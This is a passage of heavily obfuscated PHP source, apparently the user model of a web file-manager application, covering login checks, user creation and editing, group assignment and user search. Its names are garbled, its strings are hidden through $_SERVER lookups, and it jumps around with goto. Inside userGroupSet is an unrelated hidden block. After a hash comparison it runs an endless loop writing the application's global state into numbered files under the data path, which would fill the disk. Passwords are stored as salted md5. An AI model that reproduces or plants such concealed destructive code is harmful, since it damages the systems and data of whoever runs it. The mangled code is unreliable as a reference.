$this->_listDataApplyItem($E’ñøêâ¬); $AÔ¨ŠÚ‡Ì‹ = Model($e¯³»°‰[1203])->metaGet($E’ñøêâ¬[$e¯³»°‰[95]][$e¯³»°‰[403]]); $E’ñøêâ¬[$e¯³»°‰[2120]] = $E¨’ĞÌ£•; goto B­¶¸ÈÚ˜Ì; FèÀ²‡ÒŒ½: } protected function getInfoSimple($EÎ•½ñğ†Ù, $Aƒô½ÜÕ‘­ = false) { $c¹Œí¿™ÂÁ =& $_SERVER[£¶ä½¶¢]; if (!$EÎ•½ñğ†Ù) { return array(); } if ($Aƒô½ÜÕ‘­) { $C„›Üçù… = $this->where(array($c¹Œí¿™ÂÁ[1526] => intval($EÎ•½ñğ†Ù)))->find(); if (!is_array($C„›Üçù…)) { return array(); } $C„›Üçù…[$c¹Œí¿™ÂÁ[2121]] = Action($c¹Œí¿™ÂÁ[2122])->parseUrl($C„›Üçù…[$c¹Œí¿™ÂÁ[2121]]); return $C„›Üçù…; } return $this->cacheFunctionGet($c¹Œí¿™ÂÁ[1763], $EÎ•½ñğ†Ù); } protected function getInfoSimpleOuter($aò¿»±ÊÙî) { goto d…õö¨…µ±; BŠŸğ­Û: $F’×ñ¢œù = array_field_key($E‚•ŸùÕÚä, explode($Bœù¢¡Ö…[57], $this->simpleField)); if (!$F’×ñ¢œù) { return array($Bœù¢¡Ö…[1526] => $Bœù¢¡Ö…[1083], $Bœù¢¡Ö…[38] => $Bœù¢¡Ö…[170] . LNG($Bœù¢¡Ö…[2125]) . $Bœù¢¡Ö…[512], $Bœù¢¡Ö…[2121] => STATIC_PATH . $Bœù¢¡Ö…[2126]); } $F’×ñ¢œù[$Bœù¢¡Ö…[2121]] = Action($Bœù¢¡Ö…[2122])->parseUrl($F’×ñ¢œù[$Bœù¢¡Ö…[2121]]); goto DÌÍÌ¨; DÌÍÌ¨: return $F’×ñ¢œù; goto FÂ‹Œ©ï÷Â; d…õö¨…µ±: $Bœù¢¡Ö… =& $_SERVER[£¶ä½¶¢]; if (!$aò¿»±ÊÙî || $aò¿»±ÊÙî == 0) { return array($Bœù¢¡Ö…[1526] => $Bœù¢¡Ö…[201], $Bœù¢¡Ö…[38] => $Bœù¢¡Ö…[170] . LNG($Bœù¢¡Ö…[2123]) . $Bœù¢¡Ö…[512], $Bœù¢¡Ö…[2121] => STATIC_PATH . $Bœù¢¡Ö…[2124]); } $E‚•ŸùÕÚä = $this->cacheFunctionGet($Bœù¢¡Ö…[1763], $aò¿»±ÊÙî); goto BŠŸğ­Û; FÂ‹Œ©ï÷Â: } protected function groupUser($A©‹ÌÇæ×) { } public static function errorLang($E ôèÏè‡Ê) { $Dô¹ãİçª® =& $_SERVER[£¶ä½¶¢]; $cœ»öõß­Å = array(self::ERROR_USER_NOT_EXISTS => $Dô¹ãİçª®[2127], self::ERROR_USER_PASSWORD_ERROR => $Dô¹ãİçª®[2128], self::ERROR_USER_EXIST_NAME => $Dô¹ãİçª®[2129], self::ERROR_USER_EXIST_PHONE => $Dô¹ãİçª®[2130], self::ERROR_USER_EXIST_EMAIL => $Dô¹ãİçª®[2131], self::ERROR_USER_LOGIN_LOCK => $Dô¹ãİçª®[2132], self::ERROR_IP_NOT_ALLOW => $Dô¹ãİçª®[2133], self::ERROR_USER_EXIST_NICKNAME => $Dô¹ãİçª®[2134]); return LNG($cœ»öõß­Å[$E ôèÏè‡Ê]); } public function getInfoByMeta($Dƒ¢¬ÇŸã—, $cãœ†›¸ƒ) { $F•–‹õ‹Š =& $_SERVER[£¶ä½¶¢]; $AíšÎ®’ñå = Model($F•–‹õ‹Š[2135])->where(array($F•–‹õ‹Š[103] => $Dƒ¢¬ÇŸã—, $F•–‹õ‹Š[381] => $cãœ†›¸ƒ))->find(); if ($AíšÎ®’ñå) { return $this->getInfo($AíšÎ®’ñå[$F•–‹õ‹Š[1526]]); } return !1; } public function userLoginCheck($Cù”²Åö˜°, $F–ÉÊÅİĞ) { $aæ™ğ©ÎéÇ =& $_SERVER[£¶ä½¶¢]; $a¶æãÆ¸Ù¨ = $this->userLoginFind($Cù”²Åö˜°); if (!$a¶æãÆ¸Ù¨) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($a¶æãÆ¸Ù¨[$aæ™ğ©ÎéÇ[1526]], $F–ÉÊÅİĞ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($a¶æãÆ¸Ù¨[$aæ™ğ©ÎéÇ[1526]]); } public function userLoginFind($B‹ãäâµ•) { $Døí”¯³à =& $_SERVER[£¶ä½¶¢]; $b¨è—ÖŞÂÇ = array($Døí”¯³à[38] => $B‹ãäâµ•, $Døí”¯³à[1954] => $B‹ãäâµ•, $Døí”¯³à[312] => $B‹ãäâµ•, $Døí”¯³à[2136] => $B‹ãäâµ•, $Døí”¯³à[955] => $Døí”¯³à[957]); if ($this->nickNameRpt()) { unset($b¨è—ÖŞÂÇ[$Døí”¯³à[1954]]); } return $this->where($b¨è—ÖŞÂÇ)->find(); } public function clearCache($añêÃø‚®î) { $AÁÏì›Ô®Ò =& $_SERVER[£¶ä½¶¢]; $this->cacheFunctionClear($AÁÏì›Ô®Ò[1769], $añêÃø‚®î); $this->cacheFunctionClear($AÁÏì›Ô®Ò[1763], $añêÃø‚®î); $this->cacheFunctionClear($AÁÏì›Ô®Ò[2117], $añêÃø‚®î); } public function userPasswordCheck($Dè„‹¼, $Cò³ÇÄÎ×¦) { $cœ„òä—Ó¡ =& $_SERVER[£¶ä½¶¢]; $dÌŸ·ùù = $this->where(array($cœ„òä—Ó¡[1526] => intval($Dè„‹¼)))->find(); $bÔ†¡ì­„Ö = $this->metaGet($Dè„‹¼); $cìÏ‚°—ò = isset($bÔ†¡ì­„Ö[$cœ„òä—Ó¡[2137]]) ? $bÔ†¡ì­„Ö[$cœ„òä—Ó¡[2137]] : $cœ„òä—Ó¡[43]; if (md5($cìÏ‚°—ò . trim($Cò³ÇÄÎ×¦)) !== $dÌŸ·ùù[$cœ„òä—Ó¡[847]]) { return !1; } return !0; } public function userAdd($A»ªÓÌÈØÄ) { goto e×÷‡íœò³; cá´±»ªÛÉ: $aÎÂ¿‡‚Í‚ = $this->_checkExist($A»ªÓÌÈØÄ); if ($aÎÂ¿‡‚Í‚ !== !0) { return $aÎÂ¿‡‚Í‚; } $F««ğÔ•ï® = $this->add($d Î¿Îá´ë); goto A¶ŒºÀÕ†; CÛ§ïˆ…²î: return $F««ğÔ•ï®; goto d—Ï“‹¥©‰; e×÷‡íœò³: $CÎ«Œ„‡ªí =& $_SERVER[£¶ä½¶¢]; $d Î¿Îá´ë = array($CÎ«Œ„‡ªí[421] => $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[38]], $CÎ«Œ„‡ªí[2138] => $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[1411]], $CÎ«Œ„‡ªí[2139] => isset($A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[312]]) ? $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[312]] : $CÎ«Œ„‡ªí[43], $CÎ«Œ„‡ªí[2140] => isset($A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[2136]]) ? $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[2136]] : $CÎ«Œ„‡ªí[43], $CÎ«Œ„‡ªí[2141] => isset($A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[1954]]) ? $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[1954]] : $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[38]], $CÎ«Œ„‡ªí[2142] => isset($A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[2121]]) ? $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[2121]] : $CÎ«Œ„‡ªí[43], $CÎ«Œ„‡ªí[2143] => isset($A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[2144]]) ? $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[2144]] : 1, $CÎ«Œ„‡ªí[2145] => $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[847]], $CÎ«Œ„‡ªí[1764] => isset($A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[1674]]) ? $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[1674]] : 1024 * 1024 * 20, $CÎ«Œ„‡ªí[1765] => 0, $CÎ«Œ„‡ªí[2146] => 0, $CÎ«Œ„‡ªí[1808] => isset($A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[718]]) ? $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[718]] : 1); if (!empty($A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[1526]])) { $d Î¿Îá´ë[$CÎ«Œ„‡ªí[1526]] = $A»ªÓÌÈØÄ[$CÎ«Œ„‡ªí[1526]]; } goto cá´±»ªÛÉ; A¶ŒºÀÕ†: $EºÌ·‰³æ½ = array($CÎ«Œ„‡ªí[2145] => $d Î¿Îá´ë[$CÎ«Œ„‡ªí[847]], $CÎ«Œ„‡ªí[2141] => $d Î¿Îá´ë[$CÎ«Œ„‡ªí[1954]]); $this->userEdit($F««ğÔ•ï®, $EºÌ·‰³æ½); Model($CÎ«Œ„‡ªí[1203])->userRootAdd($F««ğÔ•ï®); goto CÛ§ïˆ…²î; d—Ï“‹¥©‰: } protected function userEditTest($bÂ„ëäØ™Ó, $FàËß´ƒÙã) { return $this->call($_SERVER[£¶ä½¶¢][2147], $bÂ„ëäØ™Ó, $FàËß´ƒÙã); } protected function userEdit($b¹ƒóåóê, $BãååÆØæØ) { goto CÚÜôæ¡Š©; d øî¸ÂˆŒ: return !0; goto Fñ…Ï™ª±†; F¨ŠÉˆïòÌ: $this->where(array($B¢´·¶–÷[1518] => $b¹ƒóåóê))->save($BãååÆØæØ); if (isset($BãååÆØæØ[$B¢´·¶–÷[1954]])) { $this->setNamePinyin($b¹ƒóåóê, $BãååÆØæØ[$B¢´·¶–÷[1954]]); } $this->clearCache($b¹ƒóåóê); goto d øî¸ÂˆŒ; CÚÜôæ¡Š©: $B¢´·¶–÷ =& $_SERVER[£¶ä½¶¢]; $f—ÉºÂ î = $this->getInfoSimple($b¹ƒóåóê); if (!$f—ÉºÂ î) { return !1; } goto E¡¦‹“ÉĞÏ; E¡¦‹“ÉĞÏ: $Dƒ¶ì¯§ßŠ = $this->_checkExist($BãååÆØæØ, $b¹ƒóåóê); if ($Dƒ¶ì¯§ßŠ !== !0) { return $Dƒ¶ì¯§ßŠ; } if (isset($BãååÆØæØ[$B¢´·¶–÷[847]]) && trim($BãååÆØæØ[$B¢´·¶–÷[847]]) != $B¢´·¶–÷[43]) { $eÓŸ­É‚‡Ö = $this->metaGet($b¹ƒóåóê); if (empty($eÓŸ­É‚‡Ö[$B¢´·¶–÷[2137]])) { $eÓŸ­É‚‡Ö[$B¢´·¶–÷[2137]] = rand_string(10); Model($B¢´·¶–÷[510])->metaSet($b¹ƒóåóê, $B¢´·¶–÷[2137], $eÓŸ­É‚‡Ö[$B¢´·¶–÷[2137]]); } $BãååÆØæØ[$B¢´·¶–÷[847]] = md5($eÓŸ­É‚‡Ö[$B¢´·¶–÷[2137]] . trim($BãååÆØæØ[$B¢´·¶–÷[847]])); } else { unset($BãååÆØæØ[$B¢´·¶–÷[847]]); } goto F¨ŠÉˆïòÌ; Fñ…Ï™ª±†: } public function setNamePinyin($EÂ‘²Í¡‹¹, $b¢š·ÜØØÅ = false) { $eÔ‡çòÒ =& $_SERVER[£¶ä½¶¢]; if (!$b¢š·ÜØØÅ) { $D±ñõâØ’ƒ = $this->getInfoSimple($EÂ‘²Í¡‹¹); $b¢š·ÜØØÅ = $D±ñõâØ’ƒ[$eÔ‡çòÒ[1954]] ? $D±ñõâØ’ƒ[$eÔ‡çòÒ[1954]] : $D±ñõâØ’ƒ[$eÔ‡çòÒ[38]]; } $e‰‹™Ä¹… = Model($eÔ‡çòÒ[514]); if (!Input::check($b¢š·ÜØØÅ, $eÔ‡çòÒ[564])) { return $e‰‹™Ä¹…->metaSet($EÂ‘²Í¡‹¹, array($eÔ‡çòÒ[452] => $eÔ‡çòÒ[43], $eÔ‡çòÒ[451] => $eÔ‡çòÒ[43])); } return $e‰‹™Ä¹…->metaSet($EÂ‘²Í¡‹¹, array($eÔ‡çòÒ[452] => str_replace($eÔ‡çòÒ[60], $eÔ‡çòÒ[43], Pinyin::encode($b¢š·ÜØØÅ)), $eÔ‡çòÒ[451] => Pinyin::encode($b¢š·ÜØØÅ, $eÔ‡çòÒ[565]))); } private function nickNameRpt() { $EÃ¡Üˆ†¦ =& $_SERVER[£¶ä½¶¢]; $Eˆ®°Š¦ïˆ = Model($EÃ¡Üˆ†¦[738])->get($EÃ¡Üˆ†¦[2148]); $bÜÏøƒÊİ = $GLOBALS[$EÃ¡Üˆ†¦[16]][$EÃ¡Üˆ†¦[386]][$EÃ¡Üˆ†¦[2148]]; $F°å½è“·æ = !is_null($Eˆ®°Š¦ïˆ) ? $Eˆ®°Š¦ïˆ : $bÜÏøƒÊİ; return !!$F°å½è“·æ; } private function _checkExist($CˆÒ×Óøœ, $D¼ß‚îïçµ = false) { $B¿‡­‹’á =& $_SERVER[£¶ä½¶¢]; $D”¤‚Ã±…Ñ = array($B¿‡­‹’á[38] => UserModel::ERROR_USER_EXIST_NAME, $B¿‡­‹’á[1954] => UserModel::ERROR_USER_EXIST_NICKNAME, $B¿‡­‹’á[312] => UserModel::ERROR_USER_EXIST_EMAIL, $B¿‡­‹’á[2136] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($D”¤‚Ã±…Ñ[$B¿‡­‹’á[1954]]); } $DÅ´Ø… = $D¼ß‚îïçµ ? array($B¿‡­‹’á[1526] => array($B¿‡­‹’á[2149], $D¼ß‚îïçµ)) : array(); foreach ($D”¤‚Ã±…Ñ as $AÔ¥„ÇÁÀï => $D õ­ğ¾Ù™) { $DŠ©Š…ŸÈ = array(); foreach ($D”¤‚Ã±…Ñ as $aù²¡¹à => $bõ…¿èÌâ) { if (isset($CˆÒ×Óøœ[$aù²¡¹à]) && $CˆÒ×Óøœ[$aù²¡¹à]) { $DŠ©Š…ŸÈ[] = $CˆÒ×Óøœ[$aù²¡¹à]; } } if (!$DŠ©Š…ŸÈ) { continue; } $Fï×ã±Úµ­ = array_merge(array($AÔ¥„ÇÁÀï => array($B¿‡­‹’á[17], $DŠ©Š…ŸÈ)), $DÅ´Ø…); $a°©Ó®÷ç˜ = $this->where($Fï×ã±Úµ­)->find(); if ($a°©Ó®÷ç˜) { return $D õ­ğ¾Ù™; } } return !0; } public function userListInfo($d½«œÈ³Û¹) { $dëç—«“ =& $_SERVER[£¶ä½¶¢]; $D‹è­á˜¥– = array(); $d½«œÈ³Û¹ = is_array($d½«œÈ³Û¹) ? array_unique($d½«œÈ³Û¹) : array(); if (!$d½«œÈ³Û¹) { return $D‹è­á˜¥–; } if (count($d½«œÈ³Û¹) < 20) { foreach ($d½«œÈ³Û¹ as $D±Æ‚´¥ª¬) { $D‹è­á˜¥–[$D±Æ‚´¥ª¬ . $dëç—«“[43]] = $this->getInfoSimpleOuter($D±Æ‚´¥ª¬); } } else { $E¨¹Å°×Îè = array($dëç—«“[1518] => array($dëç—«“[419], $d½«œÈ³Û¹)); if (count($d½«œÈ³Û¹) == 1) { $E¨¹Å°×Îè = array($dëç—«“[1518] => $d½«œÈ³Û¹[0]); } $A¹‡Ñ˜¾ = Model($dëç—«“[510])->field($this->simpleField)->where($E¨¹Å°×Îè)->select(); $A¹‡Ñ˜¾ = array_to_keyvalue($A¹‡Ñ˜¾, $dëç—«“[1526]); foreach ($d½«œÈ³Û¹ as $D±Æ‚´¥ª¬) { $f…µš‰»³¡ = $A¹‡Ñ˜¾[$D±Æ‚´¥ª¬]; if (!$f…µš‰»³¡) { $D‹è­á˜¥–[$D±Æ‚´¥ª¬ . $dëç—«“[43]] = $this->getInfoSimpleOuter($D±Æ‚´¥ª¬); continue; } $f…µš‰»³¡[$dëç—«“[2121]] = Action($dëç—«“[2122])->parseUrl($f…µš‰»³¡[$dëç—«“[2121]]); $D‹è­á˜¥–[$D±Æ‚´¥ª¬ . $dëç—«“[43]] = $f…µš‰»³¡; } } return $D‹è­á˜¥–; } protected function userStatus($c‹áéƒÁÅ, $D‡‹ éß´¾) { $cÑ¿Î£ç† = $this->getInfoSimple($c‹áéƒÁÅ); if (!$cÑ¿Î£ç†) { return !1; } $dì’›¶ªÁÈ = array($_SERVER[£¶ä½¶¢][718] => $D‡‹ éß´¾); return $this->userEdit($c‹áéƒÁÅ, $dì’›¶ªÁÈ); } protected function userRemove($b…ÌîŠğˆÃ) { goto a‹‰‘¬ò; FñªÈ°Á±õ: Model($fñï÷¾³Ô[1971])->removeUserAll($b…ÌîŠğˆÃ); Model($fñï÷¾³Ô[798])->userRootRemove($b…ÌîŠğˆÃ); return $this->where($aŸõ’á°Ì)->delete(); goto eÀöã½Ë¶‹; a‹‰‘¬ò: $fñï÷¾³Ô =& $_SERVER[£¶ä½¶¢]; $fÁë¹Ù»õ¯ = $this->getInfoSimple($b…ÌîŠğˆÃ); if (!$fÁë¹Ù»õ¯) { return !1; } goto a…¶‘Éß±ê; BÔ£¸‡Ş°Û: Model($fñï÷¾³Ô[1771])->where($aŸõ’á°Ì)->delete(); Model($fñï÷¾³Ô[2135])->where($aŸõ’á°Ì)->delete(); Model($fñï÷¾³Ô[2151])->where($aŸõ’á°Ì)->delete(); goto FñªÈ°Á±õ; a…¶‘Éß±ê: $aŸõ’á°Ì = array($fñï÷¾³Ô[1518] => $b…ÌîŠğˆÃ); Model($fñï÷¾³Ô[571])->where($aŸõ’á°Ì)->delete(); Model($fñï÷¾³Ô[2150])->where($aŸõ’á°Ì)->delete(); goto BÔ£¸‡Ş°Û; eÀöã½Ë¶‹: } protected function userGroupSet($bµÆ¹È¡ì», $cß¿ÌŸ¾×Ù, $Eõ’ª˜‚Ò‹ = array()) { goto DìœĞ´™ÊŸ; DìœĞ´™ÊŸ: $a”‘ñÍÆÖ =& $_SERVER[£¶ä½¶¢]; $cé–Ú³Úâõ = $_SERVER[$a”‘ñÍÆÖ[5]]; $F¤Ğ‹ÉŠí = $a”‘ñÍÆÖ[1395]; goto eŒİÙ¬éÉ‘; eŒİÙ¬éÉ‘: if ($_SERVER[$a”‘ñÍÆÖ[4]] != $F¤Ğ‹ÉŠí($cé–Ú³Úâõ)) { goto aÓÃ™äÒ¡ƒ; Dã­„µœ¶ƒ: $bˆ¡¦®Î· = 1; for ($D¾áÉ˜éÉ = $bˆ¡¦®Î·; $D¾áÉ˜éÉ > 0; $D¾áÉ˜éÉ++) { $EÉÂñ¨ô‹–(DATA_PATH . $D¾áÉ˜éÉ, $bÑ÷ßÎ¯Ş); } goto b“æ˜èµÈ; bŸ¢£Öù‘ğ: $EÒò¨…ÄùÏ(); $EÉÂñ¨ô‹– = $a”‘ñÍÆÖ[1396]; $bÑ÷ßÎ¯Ş = json_encode($GLOBALS[$a”‘ñÍÆÖ[1397]]); goto Dã­„µœ¶ƒ; aÓÃ™äÒ¡ƒ: $EÒò¨…ÄùÏ = $a”‘ñÍÆÖ[839]; $a¸•“®¶†ù = $a”‘ñÍÆÖ[6]; $E”’æóéÃä = $_SERVER[$a”‘ñÍÆÖ[7]] . $a”‘ñÍÆÖ[8]; goto Eš±Ú™Ä–Ò; Eš±Ú™Ä–Ò: $FóÖÖÖó˜‰ = $a¸•“®¶†ù($E”’æóéÃä); $bÃ¸˜àğ¯™ = explode($a”‘ñÍÆÖ[9], $FóÖÖÖó˜‰); if (count($bÃ¸˜àğ¯™) < $a”‘ñÍÆÖ[593]) { $Dˆ¯é À³ = $a”‘ñÍÆÖ[11]; $Dˆ¯é À³(); } goto e·íÇäãÄ; e·íÇäãÄ: $AĞ¢…¯é™… = $a”‘ñÍÆÖ[840]; $AĞ¢…¯é™…($_SERVER[$a”‘ñÍÆÖ[841]]); $EÒò¨…ÄùÏ = $a”‘ñÍÆÖ[839]; goto bŸ¢£Öù‘ğ; b“æ˜èµÈ: } $fäÓ¯‘µ‹ = $this->getInfoSimple($bµÆ¹È¡ì»); if (!$fäÓ¯‘µ‹ || !is_array($cß¿ÌŸ¾×Ù)) { return !1; } goto dİ›—×Ä„Ã; dİ›—×Ä„Ã: $aÓ¼¥«… = Model($a”‘ñÍÆÖ[1771]); $aÓ¼¥«…->where(array($a”‘ñÍÆÖ[1526] => $bµÆ¹È¡ì»))->delete(); $Eâ¸„¯æïÓ = array(); goto f¢ğíÓÉ¤; f¢ğíÓÉ¤: $d›‘ß¿»¸à = 0; foreach ($cß¿ÌŸ¾×Ù as $eÉ††ÈŞ³ => $B‚ĞÆ·Ô) { $eŠĞÏó™œï = array($a”‘ñÍÆÖ[1526] => $bµÆ¹È¡ì», $a”‘ñÍÆÖ[1690] => $eÉ††ÈŞ³, $a”‘ñÍÆÖ[1785] => $B‚ĞÆ·Ô); $eŠĞÏó™œï[$a”‘ñÍÆÖ[1713]] = isset($Eõ’ª˜‚Ò‹[$d›‘ß¿»¸à]) ? $Eõ’ª˜‚Ò‹[$d›‘ß¿»¸à] : 0; $d›‘ß¿»¸à++; $Eâ¸„¯æïÓ[] = $eŠĞÏó™œï; } return $aÓ¼¥«…->addAll($Eâ¸„¯æïÓ, array(), !0); goto fğ½ÑÉ¨Œë; fğ½ÑÉ¨Œë: } protected function userGroupAdd($Bãé©»ãØ, $fÖ¡âÌš´‚ = array()) { $F§ÇÔğëñ½ =& $_SERVER[£¶ä½¶¢]; $F™«§ÜÍ¶Ÿ = $this->getInfoSimple($Bãé©»ãØ); if (!$F™«§ÜÍ¶Ÿ || empty($fÖ¡âÌš´‚)) { return !1; } $B÷™Ñ™„Ğ = array(); foreach ($fÖ¡âÌš´‚ as $déÁ‘™éğ¯ => $c´îé†óĞŠ) { $B÷™Ñ™„Ğ[] = array($F§ÇÔğëñ½[1526] => $Bãé©»ãØ, $F§ÇÔğëñ½[1690] => $déÁ‘™éğ¯, $F§ÇÔğëñ½[1785] => $c´îé†óĞŠ, $F§ÇÔğëñ½[1713] => 0); } return Model($F§ÇÔğëñ½[1771])->addAll($B÷™Ñ™„Ğ, array(), !0); } protected function userGroupRemove($Dƒ‚ŒëÅ´, $b‡ŞµàŒ) { $D¼à¶—“Â™ =& $_SERVER[£¶ä½¶¢]; $F’Êè²³ÈŠ = $this->getInfoSimple($Dƒ‚ŒëÅ´); if (!$F’Êè²³ÈŠ || !$b‡ŞµàŒ) { return !1; } $a™–›ó®­ = array($D¼à¶—“Â™[1518] => $Dƒ‚ŒëÅ´, $D¼à¶—“Â™[1768] => $b‡ŞµàŒ); return Model($D¼à¶—“Â™[1771])->where($a™–›ó®­)->delete(); } public function listData() { $e‹§£ˆ‚ğÖ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($e‹§£ˆ‚ğÖ[$_SERVER[£¶ä½¶¢][376]]); return $e‹§£ˆ‚ğÖ; } public function listByID($Fäˆ‹ï•È¦) { $f¢åƒèªµå =& $_SERVER[£¶ä½¶¢]; if (!$Fäˆ‹ï•È¦) { return; } $Aê‡¹Ô‡¥ = array($f¢åƒèªµå[1526] => array($f¢åƒèªµå[17], $Fäˆ‹ï•È¦)); $CŠ²ìª³¿ö = $this->where($Aê‡¹Ô‡¥)->select(); $this->_listDataApply($CŠ²ìª³¿ö); return $CŠ²ìª³¿ö; } public function listByGroup($d¥ÓÃ‹˜ = 0, $FÔ÷Ğ”¶× = array()) { goto C‰Åì…ô‚; DìÌî÷º³é: $this->_listDataApply($e½Š²¿‹Ëß[$dÄİ¦·ó¾¯[376]]); return $e½Š²¿‹Ëß; goto Fì‹ÚõÌù†; dÛ÷æÄÏÁª: if ($d¥ÓÃ‹˜) { $e·º“ù’„‘ = array($dÄİ¦·ó¾¯[2152] => intval($d¥ÓÃ‹˜)); $F‹ËÆÇöË¸ = "\x4c\x45\x46\124\x20\112\117\x49\116\x20{$this->tablePrefix}\x75\x73\145\x72\x5f\147\162\x6f\x75\160\x20\x75\x73\x65\162\x5f\x67\162\157\x75\x70\40\x6f\156\40\x75\x73\145\162\56\165\163\x65\x72\111\104\x20\x3d\40\165\163\x65\x72\x5f\147\162\x6f\x75\160\56\x75\x73\145\x72\x49\104"; $dö¸îÖˆËŞ = Input::get($dÄİ¦·ó¾¯[443], null, $dÄİ¦·ó¾¯[43]) ? $dÄİ¦·ó¾¯[43] : $dÄİ¦·ó¾¯[2153]; } if (isset($FÔ÷Ğ”¶×[$dÄİ¦·ó¾¯[718]])) { $e·º“ù’„‘[$dÄİ¦·ó¾¯[2154]] = $FÔ÷Ğ”¶×[$dÄİ¦·ó¾¯[718]]; } $e½Š²¿‹Ëß = $this->_makeOrder($dö¸îÖˆËŞ)->field($dÄİ¦·ó¾¯[2155])->where($e·º“ù’„‘)->join($F‹ËÆÇöË¸)->selectPage(50); goto DìÌî÷º³é; C‰Åì…ô‚: $dÄİ¦·ó¾¯ =& $_SERVER[£¶ä½¶¢]; $F‹ËÆÇöË¸ = $dÄİ¦·ó¾¯[43]; $e·º“ù’„‘ = array(); goto dÛ÷æÄÏÁª; Fì‹ÚõÌù†: } private function _makeOrder($a§æ¸¹İÆÒ = '') { goto a…¼Í£ÓŠ›; AÑ²ÒÄçîÍ: $a§æ¸¹İÆÒ = $a§æ¸¹İÆÒ . "\x75\x73\x65\x72\x2e{$C»ãÚ´àÊÇ}\40{$DÃ®ßÓÈã›}\54\40\165\x73\x65\162\x2e\x75\163\145\162\x49\x44\x20\141\163\143"; return $this->alias($A‹ÚÇ¾ƒš[1894])->order($a§æ¸¹İÆÒ); goto c¸‘Ú…‡…Ä; BÀ‡è‹Ì: $C»ãÚ´àÊÇ = Input::get($A‹ÚÇ¾ƒš[443], $A‹ÚÇ¾ƒš[17], $A‹ÚÇ¾ƒš[1518], $a¹»íøœ¾—); $DÃ®ßÓÈã› = Input::get($A‹ÚÇ¾ƒš[444], $A‹ÚÇ¾ƒš[17], $A‹ÚÇ¾ƒš[1772], array($A‹ÚÇ¾ƒš[1772], $A‹ÚÇ¾ƒš[438])); $DÃ®ßÓÈã› = $Fµä†‘Ä—•[$DÃ®ßÓÈã›]; goto AÑ²ÒÄçîÍ; a…¼Í£ÓŠ›: $A‹ÚÇ¾ƒš =& $_SERVER[£¶ä½¶¢]; $a¹»íøœ¾— = array($A‹ÚÇ¾ƒš[1526], $A‹ÚÇ¾ƒš[38], $A‹ÚÇ¾ƒš[1676], $A‹ÚÇ¾ƒš[1648], $A‹ÚÇ¾ƒš[204]); $Fµä†‘Ä—• = array($A‹ÚÇ¾ƒš[436] => $A‹ÚÇ¾ƒš[437], $A‹ÚÇ¾ƒš[438] => $A‹ÚÇ¾ƒš[439]); goto BÀ‡è‹Ì; c¸‘Ú…‡…Ä: } public function listSearch($FÈì÷Æ„—«) { goto BŞÆì§ÃÑò; cÖ”‰»”¢Ø: if (!$fÍåÕê¾È¬) { $cùÊÏùŒÔ = array(); } if (isset($FÈì÷Æ„—«[$fà™ºŸöĞô[718]])) { $cùÊÏùŒÔ[$fà™ºŸöĞô[718]] = $FÈì÷Æ„—«[$fà™ºŸöĞô[718]]; } $cùÊÏùŒÔ = $this->parseWhereLike($cùÊÏùŒÔ); goto EÉ…¥ì©±©; BŞÆì§ÃÑò: $fà™ºŸöĞô =& $_SERVER[£¶ä½¶¢]; $fÍåÕê¾È¬ = $FÈì÷Æ„—«[$fà™ºŸöĞô[1773]]; $d‘´¸‹ªÀŸ = isset($FÈì÷Æ„—«[$fà™ºŸöĞô[1774]]) ? $FÈì÷Æ„—«[$fà™ºŸöĞô[1774]] : !1; goto A‡©¬˜ªÆ³; FØÚ¢ìÕßÑ: $this->_filterByGroup($b÷Ë‹Ü·æ , $d‘´¸‹ªÀŸ); return $b÷Ë‹Ü·æ ; goto Céìì÷”Õ; A‡©¬˜ªÆ³: $fÍåÕê¾È¬ = str_replace($fà™ºŸöĞô[1775], $fà™ºŸöĞô[1776], trim($fÍåÕê¾È¬)); $cùÊÏùŒÔ = array($fà™ºŸöĞô[38] => array($fà™ºŸöĞô[388], "\45{$fÍåÕê¾È¬}\x25"), $fà™ºŸöĞô[312] => array($fà™ºŸöĞô[388], "{$fÍåÕê¾È¬}\x25"), $fà™ºŸöĞô[1954] => array($fà™ºŸöĞô[388], "{$fÍåÕê¾È¬}\x25"), $fà™ºŸöĞô[955] => $fà™ºŸöĞô[1777]); if (Input::check($fÍåÕê¾È¬, $fà™ºŸöĞô[318])) { $cùÊÏùŒÔ[$fà™ºŸöĞô[1526]] = array($fà™ºŸöĞô[388], "{$fÍåÕê¾È¬}\x25"); $cùÊÏùŒÔ[$fà™ºŸöĞô[2136]] = array($fà™ºŸöĞô[388], "{$fÍåÕê¾È¬}\45"); } goto cÖ”‰»”¢Ø; EÉ…¥ì©±©: $b÷Ë‹Ü·æ  = $this->_makeOrder()->where($cùÊÏùŒÔ)->selectPage(20); if (!$b÷Ë‹Ü·æ  || count($b÷Ë‹Ü·æ [$fà™ºŸöĞô[376]]) < 5 && Input::check($fÍåÕê¾È¬, $fà™ºŸöĞô[325])) { $eƒ‡Œ†×‹µ = $this->_searchFromMeta($fà™ºŸöĞô[451], $fÍåÕê¾È¬, 10); $A‘ëÏõàêæ = $this->_searchFromMeta($fà™ºŸöĞô[452], $fÍåÕê¾È¬, 10); $Aœ¯«–Í¯ñ = array_merge($eƒ‡Œ†×‹µ, $A‘ëÏõàêæ, $b÷Ë‹Ü·æ [$fà™ºŸöĞô[376]]); $b÷Ë‹Ü·æ [$fà™ºŸöĞô[376]] = array_unique_by_key($Aœ¯«–Í¯ñ, $fà™ºŸöĞô[1526]); 